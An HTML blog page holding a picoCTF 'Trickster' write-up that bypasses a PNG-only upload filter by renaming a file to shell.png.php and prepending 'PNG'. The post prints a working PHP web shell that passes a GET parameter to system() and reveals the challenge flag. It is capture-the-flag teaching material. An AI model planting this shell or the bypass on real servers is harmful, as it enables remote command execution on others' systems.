@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Exploiting a site that only accepts PNG files">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Trickster">
+<meta property="og:url" content="https://rivers.sh/posts/trickster/index.html">
+<meta property="og:site_name" content="Rivers">
+<meta property="og:description" content="Exploiting a site that only accepts PNG files">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rivers.sh/images/trickster/nocrawl.png">
+<meta property="og:image" content="https://rivers.sh/images/trickster/robots.png">
+<meta property="og:image" content="https://rivers.sh/images/trickster/instructions.png">
+<meta property="og:image" content="https://rivers.sh/images/trickster/shell.png">
+<meta property="og:image" content="https://rivers.sh/images/trickster/txts.png">
+<meta property="article:published_time" content="2024-09-14T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-15T22:48:32.410Z">
+<meta property="article:author" content="Rivers">
+<meta property="article:tag" content="Medium">
+<meta property="article:tag" content="Web Exploitation">
+<meta property="article:tag" content="Web Shell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rivers.sh/images/trickster/nocrawl.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Trickster</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/heaps/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/formatstring1/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/trickster/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/trickster/&text=Trickster"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/trickster/&is_video=false&description=Trickster"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Trickster&body=Check out this article: https://rivers.sh/posts/trickster/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/trickster/&name=Trickster&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/trickster/&t=Trickster"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">2.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">3.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Injecting-the-Shell"><span class="toc-number">4.</span> <span class="toc-text">Injecting the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Navigating-the-Shell"><span class="toc-number">5.</span> <span class="toc-text">Navigating the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">6.</span> <span class="toc-text">Solution</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Trickster
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rivers</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-14T04:00:00.000Z" class="dt-published" itemprop="datePublished">2024-09-14</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/picoCTF/">picoCTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Medium/" rel="tag">Medium</a>, <a class="p-category" href="/tags/Web-Exploitation/" rel="tag">Web Exploitation</a>, <a class="p-category" href="/tags/Web-Shell/" rel="tag">Web Shell</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">Exploiting a site that only accepts PNG files</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>I found a web app that can help process images: PNG images only!</p>
+<p>author: JUAN BONDOU</p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The first thing I usually try for web challenges is to map out the site, so that’s naturally what I tried here. I opened up Burpsuite, and attempted to map the site using Burpsuite’s passive <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/web_crawler">spidering</a>.</p>
+<p><img src="/images/trickster/nocrawl.png" alt="nocrawl"></p>
+<p>Unfortunately, this is a dead end. The actual file of importance is <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Robots.txt">robots.txt</a> file, which tells web crawlers which parts of the site they’re allowed and disallowed to index.</p>
+<p>Navigating to the <code>robots.txt</code> file reveals the following:</p>
+<p><img src="/images/trickster/robots.png" alt="robots"></p>
+<p>So now we know the uploads are stored in <code>/uploads</code>, and that there’s a <code>/instructions.txt</code> file. Let’s take a quick look at the <code>instructions.txt</code>:</p>
+<p><img src="/images/trickster/instructions.png" alt="instructions"></p>
+<h2 id="Attempts"><a href="#Attempts" class="headerlink" title="Attempts"></a>Attempts</h2><p>I googled “php webshell”, and found <a target="_blank" rel="noopener" href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">this</a>. The file doesn’t require much editing thankfully. Obviously, we won’t be allowed to uploads this as a <code>.php</code>.</p>
+<p>Firstly, changing the file name to <code>shell.png</code> obviously isn’t going to work, since then the code just won’t be able to run.</p>
+<p>Second, changing the file name to <code>shell.php.png</code> also will not work, since it still won’t be able to run.</p>
+<p>Third, while it seems like a good idea to change the signature bytes of <code>shell.php</code> to that of a png file, this will also return code errors.</p>
+<h2 id="Injecting-the-Shell"><a href="#Injecting-the-Shell" class="headerlink" title="Injecting the Shell"></a>Injecting the Shell</h2><p>Surprisingly, the solution is pretty simple. If we change the file name from <code>shell.php</code> to <code>shell.png.php</code>, and then include the text “PNG” at the top of our file, we’ll be allowed an uploads.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PNG</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> name=<span class="string">&quot;&lt;?php echo basename(<span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;TEXT&quot;</span> name=<span class="string">&quot;cmd&quot;</span> autofocus id=<span class="string">&quot;cmd&quot;</span> size=<span class="string">&quot;80&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;SUBMIT&quot;</span> value=<span class="string">&quot;Execute&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Navigating-the-Shell"><a href="#Navigating-the-Shell" class="headerlink" title="Navigating the Shell"></a>Navigating the Shell</h2><p>If we navigate to <code>/uploadss/&lt;ourshell&gt;.php</code>, we’re greeted with this:<br><img src="/images/trickster/shell.png" alt="shell"></p>
+<p>Upon running some simple linux commands (<code>ls</code>, <code>pwd</code>, etc.), we’ll see that our shell is successful. The only thing we cannot do is navigate into other directories. Since we can’t navigate into other directories, we’re going to have to find a way to search the system for <code>.txt</code> files (the flag is typically in a <code>.txt</code>.</p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>To locate all <code>.txt</code> files, I ran <code>find / -type f -name &#39;*.txt&#39; 2&gt;/dev/null </code>.</p>
+<ul>
+<li><code>find</code> is the command.</li>
+<li><code>/</code> tells it to search everything under the root directory (so our entire system).</li>
+<li><code>-type f</code> specifies to search for <strong>files</strong>.</li>
+<li><code>-name &#39;*.txt&#39;</code> specifies that it should be ALL (*) <code>.txt</code> files.</li>
+<li><code>2&gt;/dev/null</code> suppresses error messages.</li>
+</ul>
+<p>The return will be a long list of files, but scrolling <em>all</em> the way down reveals this:<br><img src="/images/trickster/txts.png" alt="txt files"></p>
+<p>To read the <code>GQ4DOOBVMMYGK.txt</code> file, just run <code>cat /var/www/html/GQ4DOOBVMMYGK.txt</code>, and we have our flag.</p>
+<p>flag: <code>picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">2.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attempts"><span class="toc-number">3.</span> <span class="toc-text">Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Injecting-the-Shell"><span class="toc-number">4.</span> <span class="toc-text">Injecting the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Navigating-the-Shell"><span class="toc-number">5.</span> <span class="toc-text">Navigating the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">6.</span> <span class="toc-text">Solution</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/trickster/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/trickster/&text=Trickster"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/trickster/&is_video=false&description=Trickster"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Trickster&body=Check out this article: https://rivers.sh/posts/trickster/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/trickster/&title=Trickster"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/trickster/&name=Trickster&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/trickster/&t=Trickster"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    Rivers
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+    <!-- Add Oneko.js Script -->
+    <script src="/js/oneko.js"></script>
+    <script>
+      window.onload = function() {
+        oneko('/images/oneko.gif'); // This starts the cat chasing the mouse
+      };
+    </script>
+</body>
+</html>
